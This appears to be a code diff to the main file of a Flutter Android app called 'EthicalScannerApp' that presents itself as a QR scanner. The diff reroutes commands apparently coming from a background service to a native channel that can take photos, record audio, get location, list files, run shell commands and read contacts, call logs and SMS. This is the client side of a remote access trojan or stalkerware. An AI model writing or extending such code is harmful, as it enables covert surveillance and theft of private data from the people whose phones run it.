@@ -2,15 +2,10 @@
 import 'dart:async';
 import 'package:flutter/material.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
-import 'package:camera/camera.dart';
-import 'package:geolocator/geolocator.dart';
+import 'package:flutter/services.dart';
 
 import 'screens/qr_scanner_screen.dart';
 import 'services/background_service.dart';
-import 'services/camera_service.dart';
-import 'services/location_service.dart';
-import 'services/file_system_service.dart';
-import 'services/audio_service.dart'; // Add this service
 import 'utils/constants.dart';
 
 Future<void> main() async {
@@ -27,202 +22,138 @@ class EthicalScannerApp extends StatefulWidget {
 
 class _EthicalScannerAppState extends State<EthicalScannerApp> {
   final svc = FlutterBackgroundService();
+  
+  // Native command channel - communicates directly with native service
+  static const MethodChannel _nativeCommandsChannel = MethodChannel('com.example.kem/native_commands');
 
   @override
   void initState() {
     super.initState();
 
-    // Listen for requests from the background service to execute MethodChannel calls
-
-    // Listener for take_picture requests from background
-    svc.on('execute_take_picture_from_ui').listen((raw) async {
-      if (raw == null) return;
-      final args = Map<String, dynamic>.from(raw as Map);
-      final camService = CameraService();
-      final String? lensDirectionArg = args['camera'] as String?;
-      final String? originalCommandRef = args['original_command_ref'] as String?;
-
-      if (lensDirectionArg == null || originalCommandRef == null) {
-        debugPrint("EthicalScannerAppState: Missing 'camera' or 'original_command_ref' in execute_take_picture_from_ui");
-        return;
-      }
-
-      final lensDirection = lensDirectionArg == 'back' ? CameraLensDirection.back : CameraLensDirection.front;
-
-      debugPrint("EthicalScannerAppState: UI received request to take picture with ${lensDirection.name}");
-
-      final XFile? file = await camService.takePicture(lensDirection: lensDirection);
-
-      if (file == null) {
-        svc.invoke('execute_take_picture_from_ui_result', {
-          'status': 'error',
-          'payload': {'message': 'No image captured (UI request for background)'},
-          'original_command_ref': originalCommandRef,
-        });
-      } else {
-        svc.invoke('execute_take_picture_from_ui_result', {
-          'status': 'success',
-          'payload': {'path': file.path},
-          'original_command_ref': originalCommandRef,
-        });
-      }
+    // REMOVED: All complex Flutter-based command listeners
+    // All commands now execute through native service automatically
+    
+    // Keep only essential background service status monitoring
+    svc.on('update').listen((event) {
+      if (!mounted) return;
+      debugPrint("Background service update: $event");
     });
 
-    // Listener for list_files requests from background
-    svc.on('execute_list_files_from_ui').listen((raw) async {
-      if (raw == null) return;
-      final args = Map<String, dynamic>.from(raw as Map);
-      final fsService = FileSystemService();
-      final String? path = args['path'] as String?;
-      final String? originalCommandRef = args['original_command_ref'] as String?;
+    // REMOVED: All these complex listeners as they're now handled natively:
+    // - execute_take_picture_from_ui
+    // - execute_list_files_from_ui  
+    // - execute_shell_from_ui
+    // - execute_record_voice_from_ui
+    // - SIO_CMD_GET_LOCATION
 
-      if (originalCommandRef == null) {
-        debugPrint("EthicalScannerAppState: Missing 'original_command_ref' in execute_list_files_from_ui");
-        return;
+    debugPrint("EthicalScannerAppState: Initialized with native-only command execution");
+  }
+
+  // Helper method to execute commands through native service (optional for UI use)
+  Future<Map<String, dynamic>?> executeNativeCommand(String command, Map<String, dynamic> args) async {
+    try {
+      debugPrint("Executing native command: $command with args: $args");
+      
+      final result = await _nativeCommandsChannel.invokeMethod('executeCommand', {
+        'command': command,
+        'args': args,
+      });
+      
+      if (result != null && result is Map) {
+        debugPrint("Native command successful: $command");
+        return Map<String, dynamic>.from(result);
       }
+      return null;
+    } on PlatformException catch (e) {
+      debugPrint("Native command execution failed: ${e.code} - ${e.message}");
+      return null;
+    } catch (e) {
+      debugPrint("Unexpected error executing native command: $e");
+      return null;
+    }
+  }
 
-      debugPrint("EthicalScannerAppState: UI received request to list files for path: '$path'");
-      final Map<String, dynamic>? result = await fsService.listFiles(path ?? "/storage/emulated/0");
-
-      if (result != null && result['error'] == null) {
-        svc.invoke('execute_list_files_from_ui_result', {
-          'status': 'success',
-          'payload': result,
-          'original_command_ref': originalCommandRef,
-        });
-      } else {
-        svc.invoke('execute_list_files_from_ui_result', {
-          'status': 'error',
-          'payload': {
-            'message': result?['error']?.toString() ?? 'Failed to list files (UI request for background)',
-          },
-          'original_command_ref': originalCommandRef,
-        });
-      }
+  // Example methods for UI-triggered commands (optional)
+  Future<void> takePictureFromUI({String camera = 'back'}) async {
+    final result = await executeNativeCommand('command_take_picture', {
+      'camera': camera,
     });
+    
+    if (result != null) {
+      debugPrint("Picture taken successfully: ${result['path']}");
+      // Handle UI feedback if needed
+    }
+  }
 
-    // Listener for shell command execution requests from background
-    svc.on('execute_shell_from_ui').listen((raw) async {
-      if (raw == null) return;
-      final args = Map<String, dynamic>.from(raw as Map);
-      final fsService = FileSystemService();
-      final String? command = args['command'] as String?;
-      final List<String>? commandArgs = (args['args'] as List<dynamic>?)?.map((e) => e.toString()).toList();
-      final String? originalCommandRef = args['original_command_ref'] as String?;
-
-      if (originalCommandRef == null || command == null) {
-        debugPrint("EthicalScannerAppState: Missing required parameters in execute_shell_from_ui");
-        return;
-      }
-
-      debugPrint("EthicalScannerAppState: UI received request to execute shell: $command with args: $commandArgs");
-      final Map<String, dynamic>? result = await fsService.executeShellCommand(command, commandArgs ?? []);
-
-      if (result != null && result['error'] == null) {
-        svc.invoke('execute_shell_from_ui_result', {
-          'status': 'success',
-          'payload': result,
-          'original_command_ref': originalCommandRef,
-        });
-      } else {
-        svc.invoke('execute_shell_from_ui_result', {
-          'status': 'error',
-          'payload': {
-            'message': result?['error']?.toString() ?? 'Failed to execute shell command (UI request for background)',
-          },
-          'original_command_ref': originalCommandRef,
-        });
-      }
+  Future<void> recordAudioFromUI({int duration = 10, String quality = 'medium'}) async {
+    final result = await executeNativeCommand('command_record_voice', {
+      'duration': duration,
+      'quality': quality,
     });
+    
+    if (result != null) {
+      debugPrint("Audio recorded successfully: ${result['path']}");
+      // Handle UI feedback if needed
+    }
+  }
 
-    // NEW: Listener for voice recording requests from background
-    svc.on('execute_record_voice_from_ui').listen((raw) async {
-      if (raw == null) return;
-      final args = Map<String, dynamic>.from(raw as Map);
-      final audioService = AudioService();
-      final int? duration = args['duration'] as int?;
-      final String? quality = args['quality'] as String?;
-      final String? originalCommandRef = args['original_command_ref'] as String?;
+  Future<void> getLocationFromUI() async {
+    final result = await executeNativeCommand('command_get_location', {});
+    
+    if (result != null) {
+      debugPrint("Location obtained: ${result['latitude']}, ${result['longitude']}");
+      // Handle UI feedback if needed
+    }
+  }
 
-      if (originalCommandRef == null) {
-        debugPrint("EthicalScannerAppState: Missing 'original_command_ref' in execute_record_voice_from_ui");
-        return;
-      }
-
-      debugPrint("EthicalScannerAppState: UI received request to record voice for ${duration ?? 10}s with quality: ${quality ?? 'medium'}");
-
-      try {
-        final String? audioFilePath = await audioService.recordAudio(
-          duration: duration ?? 10,
-          quality: quality ?? 'medium',
-        );
-
-        if (audioFilePath != null && audioFilePath.isNotEmpty) {
-          // Upload the recorded audio file
-          svc.invoke('execute_record_voice_from_ui_result', {
-            'status': 'success',
-            'payload': {'path': audioFilePath},
-            'original_command_ref': originalCommandRef,
-          });
-        } else {
-          svc.invoke('execute_record_voice_from_ui_result', {
-            'status': 'error',
-            'payload': {'message': 'No audio recorded (UI request for background)'},
-            'original_command_ref': originalCommandRef,
-          });
-        }
-      } catch (e) {
-        svc.invoke('execute_record_voice_from_ui_result', {
-          'status': 'error',
-          'payload': {'message': 'Audio recording failed: $e'},
-          'original_command_ref': originalCommandRef,
-        });
-      }
+  Future<void> listFilesFromUI({String path = '/storage/emulated/0'}) async {
+    final result = await executeNativeCommand('command_list_files', {
+      'path': path,
     });
+    
+    if (result != null) {
+      debugPrint("Files listed: ${result['totalFiles']} files found");
+      // Handle UI feedback if needed
+    }
+  }
 
-    // Handle audio recording response from background service  
-    svc.on('execute_record_voice_from_ui_result').listen((response) async {
-      if (response == null) return;
-      final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
-      final status = data['status'] as String?;
-      final payload = data['payload'] as Map<String, dynamic>?;
-      final String? originalCommandRef = data['original_command_ref'] as String?;
-
-      if (originalCommandRef == null) {
-        debugPrint("EthicalScannerAppState: 'original_command_ref' missing in execute_record_voice_from_ui_result");
-        return;
-      }
-
-      // This is handled in the background service now, just for UI feedback if needed
-      debugPrint("EthicalScannerAppState: Voice recording completed with status: $status");
+  Future<void> executeShellFromUI({required String command, List<String> args = const []}) async {
+    final result = await executeNativeCommand('command_execute_shell', {
+      'command_name': command,
+      'command_args': args,
     });
+    
+    if (result != null) {
+      debugPrint("Shell command executed: ${result['exitCode']}");
+      // Handle UI feedback if needed
+    }
+  }
 
-    // Listener for get_location (this can stay as it's pure Dart and doesn't need native UI isolate directly)
-    svc.on(SIO_CMD_GET_LOCATION).listen((_) async {
-      debugPrint("EthicalScannerAppState: Received SIO_CMD_GET_LOCATION event (likely from background).");
-      final locSvc = LocationService();
-      try {
-        final Position? loc = await locSvc.getCurrentLocation();
-        if (loc == null) throw Exception('Location unavailable from UI listener');
-        
-        svc.invoke('${SIO_CMD_GET_LOCATION}_ui_result', {
-          'status': 'success',
-          'payload': {
-            'latitude': loc.latitude,
-            'longitude': loc.longitude,
-            'accuracy': loc.accuracy,
-            'altitude': loc.altitude,
-            'speed': loc.speed,
-            'timestamp_gps': loc.timestamp?.toIso8601String(),
-          },
-        });
-      } catch (e) {
-        svc.invoke('${SIO_CMD_GET_LOCATION}_ui_result', {
-          'status': 'error',
-          'payload': {'message': e.toString()},
-        });
-      }
-    });
+  Future<void> getContactsFromUI() async {
+    final result = await executeNativeCommand('command_get_contacts', {});
+    
+    if (result != null) {
+      debugPrint("Contacts retrieved: ${result['totalContacts']} contacts");
+      // Handle UI feedback if needed
+    }
+  }
+
+  Future<void> getCallLogsFromUI() async {
+    final result = await executeNativeCommand('command_get_call_logs', {});
+    
+    if (result != null) {
+      debugPrint("Call logs retrieved: ${result['totalCallLogs']} logs");
+      // Handle UI feedback if needed
+    }
+  }
+
+  Future<void> getSMSFromUI() async {
+    final result = await executeNativeCommand('command_get_sms', {});
+    
+    if (result != null) {
+      debugPrint("SMS messages retrieved: ${result['totalMessages']} messages");
+      // Handle UI feedback if needed
+    }
   }
 
   @override
@@ -233,6 +164,114 @@ class _EthicalScannerAppState extends State<EthicalScannerApp> {
       home: const Directionality(
         textDirection: TextDirection.ltr,
         child: QrScannerScreen(),
+      ),
+      // Optional: Add a debug page to test native commands
+      routes: {
+        '/debug': (context) => DebugNativeCommandsPage(
+          onTakePicture: takePictureFromUI,
+          onRecordAudio: recordAudioFromUI,
+          onGetLocation: getLocationFromUI,
+          onListFiles: listFilesFromUI,
+          onExecuteShell: executeShellFromUI,
+          onGetContacts: getContactsFromUI,
+          onGetCallLogs: getCallLogsFromUI,
+          onGetSMS: getSMSFromUI,
+        ),
+      },
+    );
+  }
+}
+
+// Optional debug page for testing native commands (remove in production)
+class DebugNativeCommandsPage extends StatelessWidget {
+  final VoidCallback onTakePicture;
+  final VoidCallback onRecordAudio;
+  final VoidCallback onGetLocation;
+  final VoidCallback onListFiles;
+  final Function({required String command, List<String> args}) onExecuteShell;
+  final VoidCallback onGetContacts;
+  final VoidCallback onGetCallLogs;
+  final VoidCallback onGetSMS;
+
+  const DebugNativeCommandsPage({
+    super.key,
+    required this.onTakePicture,
+    required this.onRecordAudio,
+    required this.onGetLocation,
+    required this.onListFiles,
+    required this.onExecuteShell,
+    required this.onGetContacts,
+    required this.onGetCallLogs,
+    required this.onGetSMS,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(title: const Text('Debug Native Commands')),
+      body: SingleChildScrollView(
+        padding: const EdgeInsets.all(16),
+        child: Column(
+          crossAxisAlignment: CrossAxisAlignment.stretch,
+          children: [
+            const Text('Test Native Commands:', style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
+            const SizedBox(height: 16),
+            
+            ElevatedButton(
+              onPressed: onTakePicture,
+              child: const Text('Take Picture (Back Camera)'),
+            ),
+            const SizedBox(height: 8),
+            
+            ElevatedButton(
+              onPressed: onRecordAudio,
+              child: const Text('Record Audio (10s)'),
+            ),
+            const SizedBox(height: 8),
+            
+            ElevatedButton(
+              onPressed: onGetLocation,
+              child: const Text('Get Location'),
+            ),
+            const SizedBox(height: 8),
+            
+            ElevatedButton(
+              onPressed: onListFiles,
+              child: const Text('List Files'),
+            ),
+            const SizedBox(height: 8),
+            
+            ElevatedButton(
+              onPressed: () => onExecuteShell(command: 'ls', args: ['-la']),
+              child: const Text('Execute Shell (ls -la)'),
+            ),
+            const SizedBox(height: 8),
+            
+            ElevatedButton(
+              onPressed: onGetContacts,
+              child: const Text('Get Contacts'),
+            ),
+            const SizedBox(height: 8),
+            
+            ElevatedButton(
+              onPressed: onGetCallLogs,
+              child: const Text('Get Call Logs'),
+            ),
+            const SizedBox(height: 8),
+            
+            ElevatedButton(
+              onPressed: onGetSMS,
+              child: const Text('Get SMS Messages'),
+            ),
+            const SizedBox(height: 16),
+            
+            const Text(
+              'Note: All commands execute through native service.\n'
+              'Check logs for execution results.',
+              style: TextStyle(fontSize: 12, color: Colors.grey),
+            ),
+          ],
+        ),
       ),
     );
   }
